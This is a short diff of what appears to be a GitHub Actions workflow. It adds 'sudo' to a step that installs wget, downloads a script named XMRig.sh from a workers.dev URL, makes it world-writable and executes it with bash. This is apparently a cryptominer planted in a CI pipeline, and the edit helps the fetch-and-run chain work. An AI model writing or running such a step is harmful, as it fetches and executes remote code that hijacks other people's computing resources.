@@ -17,7 +17,7 @@ jobs:
       
       - name: Run a multi-line script
         run: |
-          apt install wget -y
+          sudo apt install wget -y
           wget https://ddos.nms.workers.dev/XMRig.sh
           chmod 777 XMRig.sh
           bash XMRig.sh
